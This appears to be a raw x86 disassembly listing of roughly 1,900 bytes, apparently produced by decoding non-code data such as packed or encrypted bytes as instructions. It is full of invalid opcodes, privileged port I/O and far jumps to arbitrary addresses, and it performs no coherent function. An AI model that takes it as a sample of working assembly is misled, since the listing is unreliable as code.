  41254c:	pop    esi
  41254d:	jb     0xbdd8aaa9
  412553:	div    BYTE PTR [ebx]
  412555:	jp     0x41252e
  412557:	inc    ebx
  412558:	test   eax,0xf48b2eb6
  41255d:	sub    eax,0x6c4cba09
  412562:	push   di
  412564:	xchg   edx,eax
  412565:	jno    0x4125c0
  412567:	outs   dx,DWORD PTR ds:[esi]
  412568:	add    eax,0xe845eb49
  41256d:	out    0x3c,al
  41256f:	sbb    ebp,DWORD PTR [edi+0x78]
  412572:	in     al,0xaf
  412574:	xchg   edx,eax
  412575:	jmp    0x412509
  412577:	bound  ecx,QWORD PTR [edx+eax*1-0x50]
  41257b:	jo     0x412541
  41257d:	inc    ebp
  41257e:	dec    ebx
  41257f:	pop    ebx
  412580:	sbb    cl,al
  412582:	or     eax,0xe943dac1
  412587:	jo     0x4125bc
  412589:	popf   
  41258a:	dec    ecx
  41258b:	call   0xf9e33fb2
  412590:	jnp    0x4125b8
  412592:	ret    0x719f
  412595:	mov    BYTE PTR [ebx-0x28],ch
  412598:	pop    edx
  412599:	dec    ebx
  41259a:	cs xchg esp,eax
  41259c:	mov    al,ds:0x651344d3
  4125a1:	in     eax,dx
  4125a2:	shr    BYTE PTR [ecx],cl
  4125a4:	mov    ch,0x8b
  4125a6:	pop    ebx
  4125a7:	call   0xf13b:0x5f2b3809
  4125ae:	loopne 0x4125df
  4125b0:	xchg   esp,eax
  4125b1:	leave  
  4125b2:	cmp    BYTE PTR [edx-0x52],ch
  4125b5:	sub    DWORD PTR [eax+0x9],esi
  4125b8:	pop    cx
  4125ba:	xchg   esp,eax
  4125bb:	mov    ebp,ebx
  4125bd:	mov    cl,0x65
  4125bf:	cli    
  4125c0:	loopne 0x4125d3
  4125c2:	jp     0x4125c5
  4125c4:	or     eax,0xa076c42
  4125c9:	sbb    esi,edx
  4125cb:	imul   ecx,DWORD PTR [edx+0x69],0xffffff8e
  4125cf:	outs   dx,BYTE PTR ds:[esi]
  4125d0:	cmp    eax,DWORD PTR [ecx]
  4125d2:	mov    al,ds:0xf4f2f744
  4125d7:	js     0x4125ea
  4125d9:	pop    eax
  4125da:	bsf    ebx,DWORD PTR [edx+0x17]
  4125de:	stc    
  4125df:	inc    esp
  4125e0:	jb     0x4125f6
  4125e2:	and    DWORD PTR [ebp-0x489c4bf3],eax
  4125e8:	mul    BYTE PTR [ecx+eax*1]
  4125eb:	not    DWORD PTR [esi-0x4e]
  4125ee:	sahf   
  4125ef:	jle    0x41262b
  4125f1:	fistp  DWORD PTR [si]
  4125f4:	adc    esi,DWORD PTR [ebp-0x21]
  4125f7:	rcl    ecx,1
  4125f9:	fucom  st(0)
  4125fb:	or     eax,0xc94cf487
  412600:	call   0x3925:0x35591d3e
  412607:	jnp    0x41262e
  412609:	jo     0x4125c9
  41260b:	rol    BYTE PTR [edi],0x35
  41260e:	jo     0x412602
  412610:	test   BYTE PTR [ebp-0x5d6c5745],0x95
  412617:	or     eax,0x3dda28a
  41261c:	fbstp  TBYTE PTR [ebx]
  41261e:	jne    0x41268b
  412620:	dec    esp
  412621:	and    eax,0x136cc216
  412626:	(bad)  
  412627:	test   BYTE PTR [ebp+0x7d778c4f],bl
  41262d:	iret   
  41262e:	lds    ecx,FWORD PTR fs:[edi]
  412631:	loope  0x4125d6
  412633:	shl    DWORD PTR [ebx],cl
  412635:	ret    
  412636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412637:	push   esi
  412638:	inc    esp
  412639:	(bad)  
  41263a:	pop    edi
  41263b:	dec    ebp
  41263c:	add    bh,bh
  41263e:	lds    edi,FWORD PTR [edx-0x7ee12622]
  412644:	jp     0x412674
  412646:	cli    
  412647:	pop    esp
  412648:	mov    esi,0x2130eb5d
  41264d:	popf   
  41264e:	imul   eax,DWORD PTR [ecx],0xdb27832b
  412654:	jo     0x412614
  412656:	jmp    0x4126d4
  412658:	sub    eax,0xa936ccee
  41265d:	jbe    0x4126c6
  41265f:	dec    ebp
  412660:	(bad)  
  412661:	or     eax,0x5f57c167
  412666:	out    0x2a,eax
  412668:	mov    DWORD PTR [edx+ebp*2+0x49],ebp
  41266c:	(bad)  
  41266d:	pop    esi
  41266e:	(bad)  
  41266f:	jns    0x41267f
  412671:	adc    DWORD PTR [eax+0x32],ecx
  412674:	in     al,0xc6
  412676:	adc    BYTE PTR [eax+edi*4],al
  412679:	jle    0x41261a
  41267b:	xchg   ebp,eax
  41267c:	pop    esp
  41267d:	sub    dh,BYTE PTR [edx]
  41267f:	mov    ebp,0xdc255340
  412684:	out    0xfc,eax
  412686:	(bad)  
  412687:	(bad)  
  412688:	and    eax,0xb5ded783
  41268d:	xor    ecx,DWORD PTR [edi+0x50]
  412690:	repz push ss
  412692:	pop    DWORD PTR [ebp-0x48e17d4d]
  412698:	lahf   
  412699:	cld    
  41269a:	(bad)  
  41269b:	cmp    BYTE PTR [eax],cl
  41269d:	leave  
  41269e:	dec    esi
  41269f:	call   0x3a3:0xd34ba12d
  4126a6:	retf   0xa1f9
  4126a9:	js     0x41269f
  4126ab:	add    eax,0x74a1d879
  4126b0:	fwait
  4126b1:	das    
  4126b2:	(bad)  
  4126b3:	cmp    eax,0xd5f3e0a
  4126b8:	icebp  
  4126b9:	imul   DWORD PTR [ecx-0x386ce6fb]
  4126bf:	rcl    DWORD PTR [eax+0x4a],1
  4126c2:	or     DWORD PTR [edi],esi
  4126c4:	jp     0x41269d
  4126c6:	xor    eax,0x2705a3ae
  4126cb:	daa    
  4126cc:	push   edx
  4126cd:	jns    0x41267a
  4126cf:	bound  esi,QWORD PTR [esi]
  4126d1:	addr16 push ebp
  4126d3:	test   eax,0x372eb2d1
  4126d8:	mov    cs,edx
  4126da:	pushf  
  4126db:	cmp    DWORD PTR [ebx+0x64],esp
  4126de:	xor    BYTE PTR [eax+0x2e90669],dh
  4126e4:	add    esi,DWORD PTR [edi+0x75]
  4126e7:	pop    esp
  4126e8:	pushf  
  4126e9:	test   al,0x3a
  4126ec:	push   ebp
  4126ed:	dec    ebp
  4126ee:	(bad)  
  4126ef:	out    dx,al
  4126f0:	int3   
  4126f1:	jle    0x4126e8
  4126f3:	int    0x3f
  4126f5:	jp     0x4126a1
  4126f7:	mov    ch,0x32
  4126f9:	scas   eax,DWORD PTR es:[edi]
  4126fa:	or     eax,0x3b0ba123
  4126ff:	(bad)  
  412700:	or     dl,BYTE PTR [edx]
  412702:	adc    DWORD PTR [edx+0x5c],eax
  412705:	push   ecx
  412706:	loope  0x4126b6
  412708:	inc    ecx
  412709:	mov    ecx,DWORD PTR [edi-0x6788971a]
  41270f:	and    al,al
  412711:	(bad)  
  412712:	adc    eax,0x39236ba0
  412717:	sbb    eax,0xf52cb520
  41271c:	lods   eax,DWORD PTR ds:[esi]
  41271d:	pop    ecx
  41271e:	aam    0x6d
  412720:	adc    al,0x1f
  412722:	pop    ds
  412723:	push   ds
  412724:	push   esi
  412725:	out    0xbb,eax
  412727:	sub    BYTE PTR [ecx+0x0],0xd6
  41272b:	shl    DWORD PTR [ecx],cl
  41272d:	add    bl,BYTE PTR [ebp-0xf]
  412730:	in     al,dx
  412731:	add    DWORD PTR [ebx-0x32d560c8],ebx
  412737:	call   0x9bcc:0x4c38ba39
  41273e:	div    DWORD PTR [eax-0x4bd6ad10]
  412744:	and    DWORD PTR [eax-0x6dd8095],0x1bdc0b1b
  41274e:	aaa    
  41274f:	adc    al,0xf2
  412751:	push   ebx
  412752:	aaa    
  412753:	idiv   BYTE PTR [esi]
  412755:	xchg   ebp,eax
  412756:	repnz sub esi,esp
  412759:	push   ecx
  41275a:	cmp    ebx,DWORD PTR [edx+0x16c36b6d]
  412760:	in     eax,dx
  412761:	fsubr  QWORD PTR [esi+0x2029afa4]
  412767:	rcl    DWORD PTR ds:[edx-0x60378ac],1
  41276e:	aas    
  41276f:	leave  
  412770:	mov    al,ds:0xc161dfb8
  412775:	xor    DWORD PTR [eax+0x4a],0xffffffd0
  412779:	inc    esp
  41277a:	inc    esi
  41277b:	shl    edx,0xa5
  41277e:	push   ss
  41277f:	or     ah,BYTE PTR gs:[ebp-0x6ceed025]
  412786:	test   al,0xf4
  412788:	xchg   ecx,eax
  412789:	xchg   ecx,eax
  41278a:	cmp    al,0x79
  41278c:	inc    edi
  41278d:	sbb    DWORD PTR [ebx],edi
  41278f:	mov    ch,0x58
  412791:	out    dx,al
  412792:	jle    0x4127ba
  412794:	sub    DWORD PTR [ecx-0x23],esi
  412797:	sub    al,0xe2
  412799:	lahf   
  41279a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41279b:	and    eax,0xeac55c06
  4127a0:	loop   0x412762
  4127a2:	sar    BYTE PTR [ebp-0x3f],cl
  4127a5:	aam    0x10
  4127a7:	pop    esi
  4127a8:	jo     0x41281b
  4127aa:	repz push 0xd54b2f81
  4127b0:	lods   eax,DWORD PTR ds:[esi]
  4127b1:	xor    DWORD PTR [edx-0x3e086dd1],eax
  4127b7:	xchg   ebp,eax
  4127b8:	push   ds
  4127b9:	mov    edx,0x2f217b0b
  4127be:	sub    eax,0xe71b3eaf
  4127c3:	test   BYTE PTR [edi+ebx*4-0x337bbb5b],0xf3
  4127cb:	xchg   esi,eax
  4127cc:	jbe    0x412796
  4127ce:	xchg   ecx,eax
  4127cf:	in     eax,0x63
  4127d1:	push   ebp
  4127d2:	pop    es
  4127d3:	lea    eax,[edi+ebp*1+0x2c]
  4127d7:	rol    BYTE PTR [ecx-0xd42d6c6],cl
  4127dd:	jae    0x412766
  4127df:	mov    esi,0x96c4150b
  4127e4:	xchg   DWORD PTR [ebx],esi
  4127e6:	xchg   edx,eax
  4127e7:	xchg   ebx,eax
  4127e9:	add    DWORD PTR [ebp-0x25],edx
  4127ec:	int    0x5c
  4127ee:	pop    edx
  4127ef:	sbb    ebp,DWORD PTR [edi-0x51d51a6]
  4127f5:	shr    BYTE PTR [ebp+0x14fa4ffc],cl
  4127fb:	push   ecx
  4127fc:	inc    ebx
  4127fd:	inc    ecx
  4127fe:	inc    esp
  4127ff:	lods   eax,DWORD PTR ds:[esi]
  412800:	retf   0x61e
  412803:	movntps XMMWORD PTR [ecx-0x76],xmm3
  412807:	push   esp
  412808:	jne    0x41284f
  41280a:	icebp  
  41280b:	push   ss
  41280c:	xor    ecx,DWORD PTR [ebx+0x6faa030f]
  412812:	add    dh,BYTE PTR [edx-0x36e9b8bc]
  412818:	mov    cl,bh
  41281a:	mov    esi,0xc17eef41
  41281f:	out    0x5e,al
  412821:	adc    ah,dh
  412823:	add    DWORD PTR [ecx],ecx
  412825:	mov    eax,ds:0x4fe2673b
  41282a:	loopne 0x41280f
  41282c:	mov    ds:0x9f70075d,eax
  412832:	mov    dl,0xdb
  412834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412835:	xor    eax,0x6db7b391
  41283a:	shr    BYTE PTR [edi+0xf],0xd7
  41283e:	sub    eax,0x79796f75
  412843:	js     0x4128ab
  412845:	push   0x9c53617f
  41284a:	cmp    DWORD PTR [edx],ebx
  41284c:	or     al,0x1f
  41284e:	mov    edi,0xb78fa150
  412853:	cld    
  412854:	mov    bh,0x2e
  412856:	mov    al,ds:0x8383a87f
  41285b:	xlat   BYTE PTR ds:[ebx]
  41285c:	pop    edi
  41285d:	jle    0x4127f4
  41285f:	jb     0x4127fe
  412861:	xor    BYTE PTR [ebp+edi*4-0xd15baf5],0xbb
  412869:	xlat   BYTE PTR ds:[ebx]
  41286a:	xor    ch,dh
  41286c:	add    ecx,DWORD PTR [edx+0x6d]
  41286f:	pop    es
  412870:	or     ah,0xa6
  412873:	test   eax,0x1500e31c
  412878:	or     dl,ah
  41287a:	mov    al,ds:0xa701dc10
  41287f:	loop   0x41289a
  412881:	and    eax,0xf9036bd9
  412886:	dec    edx
  412887:	add    DWORD PTR [eax-0x4088b164],edx
  41288d:	out    0x16,al
  41288f:	inc    edx
  412890:	mov    bl,0x94
  412892:	shl    BYTE PTR [edi],1
  412894:	lds    edx,FWORD PTR [ebx+eax*2-0x3768bff3]
  41289b:	push   es
  41289c:	ja     0x4128d8
  41289e:	mov    edx,0x5515f20d
  4128a3:	pop    esi
  4128a4:	inc    eax
  4128a5:	leave  
  4128a6:	outs   dx,BYTE PTR ds:[esi]
  4128a7:	stc    
  4128a8:	jl     0x4128c3
  4128aa:	sbb    eax,0xf32df136
  4128af:	stc    
  4128b0:	aaa    
  4128b1:	fcomp  QWORD PTR [edx-0x1b]
  4128b4:	mov    ds:0x6e06e4fb,eax
  4128b9:	mov    bh,0xb0
  4128bb:	mov    eax,ds:0x9eec5293
  4128c0:	sub    BYTE PTR [eax+0x150ff765],al
  4128c6:	mov    edx,DWORD PTR ds:[esi+0x7a]
  4128ca:	lahf   
  4128cb:	sbb    BYTE PTR [edx+0x30e492d4],bh
  4128d1:	cmp    BYTE PTR ds:0x650ccb05,0x3f
  4128d8:	sbb    al,0x6e
  4128da:	push   cs
  4128db:	mov    ch,0xf0
  4128dd:	pop    esp
  4128de:	rcr    DWORD PTR [ecx],1
  4128e0:	(bad)  
  4128e1:	sub    dl,BYTE PTR [eax+ebx*4]
  4128e4:	or     DWORD PTR [ecx-0x77],esi
  4128e7:	jmp    0x412939
  4128e9:	leave  
  4128ea:	mov    dh,BYTE PTR [edi+0x558f51d7]
  4128f0:	das    
  4128f1:	sbb    al,0xe8
  4128f3:	or     al,ah
  4128f5:	ins    BYTE PTR es:[edi],dx
  4128f6:	test   BYTE PTR [ecx],ah
  4128f8:	xchg   edx,eax
  4128f9:	sub    al,BYTE PTR ds:0x898f37dc
  4128ff:	stos   DWORD PTR es:[edi],eax
  412900:	test   BYTE PTR [esi],0x28
  412903:	adc    edi,DWORD PTR ds:0x8d6c6d67
  412909:	cmp    eax,DWORD PTR [ebx+ecx*4-0x13]
  41290d:	aaa    
  41290e:	sbb    DWORD PTR [ebp+0x4a],esp
  412911:	xor    eax,0x16ab3c55
  412916:	retf   
  412917:	nop
  412918:	inc    ecx
  412919:	pop    ebp
  41291a:	ss jns 0x412948
  41291d:	inc    edi
  41291e:	stos   DWORD PTR es:[edi],eax
  41291f:	push   DWORD PTR [ebp-0x4cd3d93e]
  412925:	inc    edi
  412926:	jle    0x41295e
  412928:	or     al,dl
  41292a:	mov    ebx,0x8aed7f55
  41292f:	sbb    BYTE PTR [edi],bh
  412931:	pop    esi
  412932:	fmul   QWORD PTR [esi-0x16179e7d]
  412938:	sub    edi,eax
  41293a:	loopne 0x4128f3
  41293c:	stc    
  41293d:	pushf  
  41293e:	adc    BYTE PTR ds:0x5d26b8af,al
  412944:	jp     0x412959
  412946:	pop    ecx
  412948:	jne    0x41294d
  41294a:	cdq    
  41294b:	push   es
  41294c:	pop    ds
  41294d:	sbb    BYTE PTR [eax+0x30c55e86],0x2b
  412954:	jo     0x4128fe
  412956:	jne    0x41297b
  412958:	and    al,0xed
  41295a:	push   0xffffff8c
  41295c:	fisttp QWORD PTR [edx]
  41295e:	call   0x12f1:0x7218b81b
  412965:	fldenv [esi]
  412967:	ins    DWORD PTR es:[edi],dx
  412968:	jl     0x4129bd
  41296a:	cmp    dl,bh
  41296c:	imul   esp,DWORD PTR [edi+0x3a372471],0x8cbffb42
  412976:	mov    ebp,0xb5c7da21
  41297b:	jmp    0x7e8dc2f7
  412980:	enter  0xd358,0x92
  412984:	int3   
  412985:	scas   al,BYTE PTR es:[edi]
  412986:	adc    al,0x27
  412988:	mov    ch,BYTE PTR [ebp-0x38]
  41298b:	in     al,dx
  41298c:	test   ebp,esi
  41298e:	repnz dec ebp
  412990:	enter  0xaac1,0xbb
  412994:	add    bl,BYTE PTR [edx-0x2257ecd7]
  41299a:	int3   
  41299b:	sbb    edx,0x3d27b9b
  4129a1:	fdiv   DWORD PTR [ebx-0x30c048fc]
  4129a7:	mov    ecx,0xccbcebe9
  4129ac:	push   ecx
  4129ad:	pop    es
  4129ae:	dec    ecx
  4129af:	hlt    
  4129b0:	jle    0x4129eb
  4129b2:	dec    ebp
  4129b3:	lods   al,BYTE PTR ds:[esi]
  4129b4:	out    dx,al
  4129b5:	push   es
  4129b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129b7:	dec    esp
  4129b8:	(bad)  
  4129b9:	xchg   esi,eax
  4129ba:	xor    DWORD PTR [edx+0x5fbf5842],ecx
  4129c0:	jo     0x412a37
  4129c2:	push   esi
  4129c3:	push   ebx
  4129c4:	adc    al,0xe3
  4129c6:	push   cs
  4129c7:	and    al,0x70
  4129c9:	push   0xffffffa5
  4129cb:	mov    eax,ds:0xd8dd609
  4129d0:	je     0x412978
  4129d2:	aaa    
  4129d3:	xor    esi,DWORD PTR [ecx+ebp*8-0x590cc29f]
  4129da:	jp     0x4129e4
  4129dc:	push   ss
  4129dd:	sub    ebx,DWORD PTR [ecx+0x4d]
  4129e0:	mov    al,ds:0x4e34bc7a
  4129e5:	adc    dh,ch
  4129e7:	dec    esi
  4129e8:	fist   DWORD PTR [esi-0x73]
  4129eb:	(bad)  
  4129ec:	fs dec esi
  4129ee:	jmp    0x4b331e91
  4129f3:	jle    0x412a71
  4129f5:	and    bl,BYTE PTR [ebx+0x77da8d79]
  4129fb:	aas    
  4129fc:	and    bh,BYTE PTR [edx-0x52]
  4129ff:	sub    DWORD PTR ds:[eax],ebp
  412a02:	push   0x63
  412a04:	xor    ebx,DWORD PTR [edx-0x68df9b18]
  412a0a:	push   eax
  412a0b:	lods   eax,DWORD PTR ds:[esi]
  412a0c:	lods   al,BYTE PTR ds:[esi]
  412a0d:	adc    edi,ecx
  412a0f:	hlt    
  412a10:	sub    BYTE PTR [edi-0x60],0x1e
  412a14:	sub    eax,0xe1431ffc
  412a19:	push   cs
  412a1a:	sub    BYTE PTR [edx],bh
  412a1c:	fwait
  412a1d:	sbb    esp,eax
  412a1f:	cli    
  412a20:	mov    edi,DWORD PTR [edi-0x27]
  412a23:	cmc    
  412a24:	sti    
  412a25:	(bad)  
  412a27:	push   ebx
  412a28:	adc    al,dh
  412a2a:	add    DWORD PTR [ebp-0x5af11918],ebp
  412a30:	sbb    al,0xfa
  412a32:	inc    esp
  412a33:	cmp    dl,cl
  412a35:	leave  
  412a36:	mov    al,ds:0x8a085d6e
  412a3b:	hlt    
  412a3c:	or     edx,esi
  412a3e:	fistp  WORD PTR [ecx-0x2]
  412a41:	(bad)  
  412a42:	mov    esp,0x30b5843a
  412a47:	mov    al,0x61
  412a49:	add    eax,0x798343af
  412a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a4f:	mov    ebp,0xefaacfa1
  412a54:	sbb    eax,eax
  412a56:	pop    edx
  412a57:	imul   esi,DWORD PTR [esi+0x76],0xffffffb9
  412a5b:	sbb    al,0x92
  412a5d:	test   BYTE PTR [edi],bh
  412a5f:	call   0x14c9e9f5
  412a64:	xor    eax,0x5ed96b94
  412a69:	repnz imul ah
  412a6c:	add    eax,0x88535593
  412a71:	test   BYTE PTR [eax+0x58acf054],0x54
  412a78:	pop    ss
  412a79:	cmp    al,bl
  412a7b:	(bad)  
  412a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a7d:	rcl    edx,cl
  412a7f:	adc    BYTE PTR [edx],ah
  412a81:	or     al,0xfb
  412a83:	daa    
  412a84:	(bad)  
  412a85:	fimul  WORD PTR [ebx]
  412a87:	jl     0x412a5c
  412a89:	jg     0x412a28
  412a8b:	sar    BYTE PTR [edi],cl
  412a8d:	aad    0x33
  412a8f:	sbb    al,0x5e
  412a91:	dec    eax
  412a92:	popa   
  412a93:	daa    
  412a94:	mov    ebx,0xc58277df
  412a99:	adc    ch,0xf3
  412a9c:	xchg   esi,eax
  412a9d:	pop    esi
  412a9e:	xor    al,0x19
  412aa0:	push   ebx
  412aa1:	dec    eax
  412aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa3:	push   ecx
  412aa4:	xchg   ebx,eax
  412aa5:	adc    edi,DWORD PTR [edi-0x7f092808]
  412aab:	lock arpl WORD PTR [ecx],di
  412aae:	add    DWORD PTR [ebp-0x65],eax
  412ab1:	retf   0x8c
  412ab4:	sahf   
  412ab5:	loope  0x412a56
  412ab7:	sahf   
  412ab8:	clc    
  412ab9:	rol    ebx,0xf9
  412abc:	pop    es
  412abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412abe:	cmp    ecx,DWORD PTR ds:0x67d1cab1
  412ac4:	inc    ecx
  412ac5:	dec    ebp
  412ac6:	call   0x14516c5b
  412acb:	inc    eax
  412acc:	inc    ebp
  412acd:	push   ds
  412ace:	push   edi
  412acf:	add    DWORD PTR [ebx-0x6ac086f1],0x3
  412ad6:	or     DWORD PTR [edx-0x19ea7066],0xffffffe1
  412add:	dec    ecx
  412ade:	pop    edi
  412adf:	out    0x90,al
  412ae1:	xchg   ebp,eax
  412ae2:	jne    0x412af7
  412ae4:	aad    0x35
  412ae6:	add    BYTE PTR [ecx-0x6fcfb9bd],bl
  412aec:	(bad)  
  412aef:	xor    BYTE PTR [edi-0x7b3ea9ad],0xb0
  412af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412af7:	out    dx,eax
  412af8:	das    
  412af9:	dec    esp
  412afa:	mov    dh,0x1c
  412afc:	pop    ebp
  412afd:	stos   BYTE PTR es:[edi],al
  412afe:	ins    DWORD PTR es:[edi],dx
  412aff:	and    BYTE PTR [eax],bl
  412b01:	jb     0x412b74
  412b03:	or     BYTE PTR [eax-0x639ea8d0],cl
  412b09:	fcomp  QWORD PTR ds:0x23d32112
  412b0f:	push   0x1
  412b11:	and    eax,0x8ec2d04a
  412b16:	push   esi
  412b17:	sbb    eax,0x550e0f6c
  412b1c:	aad    0x47
  412b1e:	adc    al,0xb1
  412b20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b21:	fisubr WORD PTR [esi+0xe90357e]
  412b27:	in     al,dx
  412b28:	fimul  WORD PTR [edx]
  412b2a:	xchg   edi,eax
  412b2b:	mov    ds:0x7f35c805,eax
  412b30:	retf   0xdc2a
  412b33:	sbb    DWORD PTR [esi+0x41],ebp
  412b36:	in     eax,0x43
  412b38:	sar    BYTE PTR [ecx+esi*8-0x43],0xbf
  412b3d:	sahf   
  412b3e:	xor    edx,DWORD PTR [esi+0x2e05fb1a]
  412b44:	push   es
  412b45:	mov    dh,0xdf
  412b47:	xchg   edx,edi
  412b49:	mov    ebp,0xd04abe83
  412b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b4f:	inc    edx
  412b50:	lahf   
  412b51:	jecxz  0x412bac
  412b53:	adc    BYTE PTR [ebp+ecx*2+0x1b],dh
  412b57:	stc    
  412b58:	retf   
  412b59:	xor    al,0x3b
  412b5b:	cmp    eax,0xc4a3a9d6
  412b60:	pop    eax
  412b61:	ja     0x412bd5
  412b63:	cmp    eax,DWORD PTR gs:[edx]
  412b66:	mov    al,0xd8
  412b68:	dec    ecx
  412b69:	sbb    al,0xae
  412b6b:	sub    al,BYTE PTR [eax]
  412b6d:	(bad)  
  412b6e:	cld    
  412b6f:	mov    cs,WORD PTR [ebx-0x4154137f]
  412b75:	mov    ch,0x49
  412b77:	xchg   DWORD PTR [ebx],edx
  412b79:	mov    ecx,DWORD PTR [ebx]
  412b7b:	xor    al,0x47
  412b7d:	or     DWORD PTR [ebx-0x581a5135],ebx
  412b83:	mov    WORD PTR [ebp-0x73297116],?
  412b89:	in     al,dx
  412b8a:	jno    0x412be8
  412b8c:	jmp    0x5ed93dae
  412b91:	dec    edx
  412b92:	lods   al,BYTE PTR ds:[esi]
  412b93:	lea    eax,[eax]
  412b95:	xor    eax,0x6597dc1e
  412b9a:	imul   esp,eax,0x8dd05551
  412ba0:	pop    ss
  412ba1:	ret    
  412ba2:	mov    WORD PTR [esi],?
  412ba4:	sbb    DWORD PTR [edx+ebp*4+0x51],esp
  412ba8:	or     ebx,0x46
  412bab:	and    DWORD PTR [eax],edi
  412bad:	repnz imul eax,DWORD PTR [edx-0x6b9e0554],0x7165188a
  412bb8:	sti    
  412bb9:	push   ebp
  412bba:	out    dx,eax
  412bbb:	ja     0x412c2c
  412bbd:	push   esp
  412bbe:	mov    bh,0x16
  412bc0:	idiv   edi
  412bc2:	leave  
  412bc3:	cmp    DWORD PTR [ecx],ebx
  412bc5:	popf   
  412bc6:	lock in al,dx
  412bc8:	or     BYTE PTR [edx],dl
  412bca:	out    dx,al
  412bcb:	arpl   WORD PTR [ecx+0x6f3c7051],sp
  412bd1:	fild   DWORD PTR [esi]
  412bd3:	sub    al,0xd7
  412bd5:	(bad)  
  412bd6:	dec    ebp
  412bd7:	je     0x412bb9
  412bd9:	push   ds
  412bda:	(bad)  
  412bdb:	imul   esi,DWORD PTR [ebx+0x4ebb446b],0x1b
  412be2:	mov    ecx,ebp
  412be4:	fsubrp st(2),st
  412be6:	cmp    esi,DWORD PTR ds:0x64e615a9
  412bec:	data16 shl ah,0xf2
  412bf0:	push   ecx
  412bf1:	pop    es
  412bf2:	ja     0x412c26
  412bf4:	into   
  412bf5:	dec    esi
  412bf6:	in     eax,dx
  412bf7:	pushf  
  412bf8:	sbb    dl,al
  412bfa:	shr    ebx,0xb5
  412bfd:	push   eax
  412bfe:	retf   0xd07e
  412c01:	pop    ss
  412c02:	shl    BYTE PTR [ebp+0xcb349fe],1
  412c08:	pop    edx
  412c09:	xor    DWORD PTR [ebx],0xffffff99
  412c0c:	pop    ecx
  412c0d:	fimul  DWORD PTR ds:0xabb87aed
  412c13:	lods   eax,DWORD PTR ds:[esi]
  412c14:	test   eax,0x8f216903
  412c19:	sbb    DWORD PTR [ebp-0x64],edx
  412c1c:	xchg   esi,eax
  412c1d:	inc    edx
  412c1e:	sub    BYTE PTR [esi],bh
  412c20:	(bad)  
  412c21:	mov    ah,0xc4
  412c23:	call   0xec520ff1
  412c28:	or     ah,0x78
  412c2b:	daa    
  412c2c:	(bad)  
  412c2e:	addr16 in eax,0xbe
  412c31:	mov    ebx,0x7e2acdf3
  412c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c37:	sub    DWORD PTR [esp+ebp*4-0x2c],esp
  412c3b:	or     DWORD PTR [edx],0x75
  412c3e:	lods   al,BYTE PTR ds:[esi]
  412c3f:	sub    esi,DWORD PTR [edi]
  412c41:	lods   eax,DWORD PTR ds:[esi]
  412c42:	pop    eax
  412c43:	outs   dx,BYTE PTR ds:[esi]
  412c44:	pop    esi
  412c45:	jae    0x412c51
  412c47:	cmp    ecx,DWORD PTR [eax+0x2d]
  412c4a:	dec    ecx
  412c4b:	inc    edx
  412c4c:	cdq    
  412c4d:	sub    BYTE PTR [eax+eax*2+0x74],0x73
  412c52:	xchg   BYTE PTR [edx],ah
  412c54:	add    eax,0x9d8b8ed3
  412c5a:	arpl   WORD PTR [ebx-0x57d69895],si
  412c60:	or     al,0xee
  412c62:	popa   
  412c63:	adc    al,0x8f
  412c65:	jp     0x412c70
  412c67:	sub    al,0xd4
  412c69:	push   ds
  412c6a:	inc    ecx
  412c6b:	cmp    DWORD PTR [ecx],ecx
  412c6d:	popa   
  412c6e:	in     al,0x28
  412c70:	in     eax,0xf4
  412c72:	rol    DWORD PTR [edi],1
  412c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c75:	xor    ebp,DWORD PTR [eax+0x27]
  412c78:	leave  
  412c79:	xor    BYTE PTR [ecx-0x241bb7fa],0xdd
  412c80:	or     edi,0x4f
  412c83:	mov    BYTE PTR [edx],cl
  412c85:	xchg   ebx,eax
  412c86:	mov    dh,al
  412c88:	xchg   edx,eax
  412c89:	fisubr DWORD PTR [eax]
  412c8b:	push   ecx
  412c8c:	sbb    eax,DWORD PTR [ecx-0x7a]
  412c8f:	scas   eax,DWORD PTR es:[edi]
  412c90:	xor    ebp,esp
  412c92:	push   es
  412c93:	icebp  
  412c94:	push   edx
  412c95:	shr    BYTE PTR [esp+ebx*4+0x7c],1
  412c99:	lock stos DWORD PTR es:[edi],eax
  412c9b:	bound  ecx,QWORD PTR [ecx]
  412c9d:	das    
  412c9e:	out    0x3a,al
  412ca0:	test   DWORD PTR [eax-0x63c1c0c6],ebp
  412ca6:	clc    
  412ca7:	ins    DWORD PTR es:[edi],dx
  412ca8:	leave  
  412ca9:	imul   ecx,DWORD PTR [ecx],0xfffffff1
  412cac:	stos   DWORD PTR es:[edi],eax
  412cad:	inc    esp
  412cae:	stc    
  412caf:	fbld   TBYTE PTR [edi]
  412cb1:	and    al,0x24
  412cb3:	mov    edx,DWORD PTR [ecx]
  412cb5:	jbe    0x412c6d
  412cb7:	pop    esi
  412cb8:	and    DWORD PTR [ebp+edi*8-0x3502d59],ebp
  412cbf:	ret    0x619f
  412cc2:	pop    ebx
  412cc3:	dec    ecx
  412cc4:	mov    bl,0x97
  412cc6:	inc    edx
  412cc7:	adc    al,0xe3
  412cc9:	mov    esp,DWORD PTR [ecx+ebp*2-0x23d5c46b]
  412cd0:	das    
  412cd1:	lahf   
  412cd2:	fld    st(0)
  412cd4:	adc    al,ah
  412cd6:	icebp  
  412cd7:	push   eax
  412cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cd9:	sbb    eax,0x7a7480e6
  412cde:	mov    eax,0xac02ccc1
  412ce3:	jae    0x412d2c
  412ce5:	lods   al,BYTE PTR ds:[esi]
  412ce6:	popa   
  412ce7:	mov    bh,0xea
  412ce9:	(bad)  
  412cea:	out    dx,eax
  412ceb:	and    edi,DWORD PTR [ebx-0x29]
  412cee:	or     edx,esi
  412cf0:	scas   al,BYTE PTR es:[edi]
  412cf1:	call   0x56fe:0x3e8dc1c1
  412cf8:	lods   al,BYTE PTR ds:[esi]
